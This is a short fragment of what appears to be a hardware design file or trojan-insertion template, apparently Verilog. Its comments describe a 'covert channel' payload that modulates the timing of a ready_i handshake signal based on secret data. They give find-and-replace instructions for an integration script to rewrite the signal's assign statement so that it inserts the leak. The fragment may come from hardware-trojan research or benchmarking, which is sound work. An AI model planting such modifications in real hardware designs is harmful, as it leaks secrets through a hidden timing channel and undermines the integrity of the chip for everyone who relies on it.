 ...
 * Payload: Modulate timing of ready_i based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of ready_i
//
// Integration Script Must Modify:
//
// IF ready_i is timing-sensitive:
//   Find: assign ready_i = ready_signal;
//   Replace: assign ready_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
